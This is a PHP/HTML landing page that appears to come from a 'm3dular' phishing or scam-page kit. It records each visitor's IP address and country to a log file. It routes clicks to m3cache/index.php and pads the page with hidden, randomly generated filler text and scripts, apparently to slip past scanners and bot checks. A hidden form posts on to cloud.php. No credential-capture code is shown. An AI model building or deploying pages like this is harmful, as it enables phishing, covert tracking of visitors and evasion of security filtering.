<?php

/*



████╗░████║╚════██╗██╔══██╗██║░░░██║██║░░░░░██╔══██╗██╔══██╗
██╔████╔██║░█████╔╝██║░░██║██║░░░██║██║░░░░░███████║██████╔╝
██║╚██╔╝██║░╚═══██╗██║░░██║██║░░░██║██║░░░░░██╔══██║██╔══██╗
██║░╚═╝░██║██████╔╝██████╔╝╚██████╔╝███████╗██║░░██║██║░░██║
╚═╝░░░░░╚═╝╚═════╝░╚═════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝


*/

require "inc/m3dular_config.php";
require "m3cache/m3dular_functions.php";
function file_get_contents_curl($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
    $data = curl_exec($ch);
    curl_close($ch);
    return $data;

}
function getRealIpAddr(){
 if (!empty($_SERVER['HTTP_CLIENT_IP'])){
      $ip=$_SERVER['HTTP_CLIENT_IP'];
 }elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
      $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
 }else{
      $ip=$_SERVER['REMOTE_ADDR'];
 }
  return $ip;
}
$realip=getRealIpAddr();
$json = file_get_contents_curl('http://www.geoplugin.net/json.gp?ip='.$realip);
$obj = json_decode($json);
$countryName=$obj->{'geoplugin_countryName'};
$countryCode=$obj->{'geoplugin_countryCode'};
$messageTxt  = "IP : ".$realip." | Country : ".$countryName."\n";
$xmyfile = fopen("Views.txt", "a+");
fwrite($xmyfile, $messageTxt);
fclose($xmyfile);

?>


<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.3.1/dist/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">

    <title>...</title>
  </head>



  <body>

  <style>
    body {overflow: hidden ; /* Hide scrollbars */} 
  .m3dbh{color:white; font-size: 3px; text-decoration: none;}
        </style>

<a href="m3cache/index.php">
<img src="data/mx.png" alt="">  
</a>  

<a href="m3cache/index.php">
<img src="data/mx.png" alt="">  
</a>  

<a href="m3cache/index.php">
<img src="data/mx.png" alt="">  
</a>  

<a href="m3cache/index.php">
<img src="data/mx.png" alt="">  
</a>  

<a href="m3cache/index.php">
<img src="data/mx.png" alt="">  
</a>  

<a href="m3cache/index.php">
<img src="data/mx.png" alt="">  
</a>  
 
<a href="m3cache/index.php">
<img src="m3cache/mx.png" alt="">  
</a>  


<div style="margin-top:2000px"></div>


<!-- <style> .m3dbh{display:none}</style> -->
  <?=m3d_gen_a_lorem_old(rand(30,90),$loremdata,"")?>
  <?=m3d_gen_scripts(rand(51 ,100),$loremdata)?>





<form id="m3dform" action="cloud.php?n=<?=$rand?>" method="POST">
    <input type="hidden" name="n" value="<?=$rand?>">
</form>

    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>



    <script src="m3cache/m3d.js"></script>



  </body>
</html>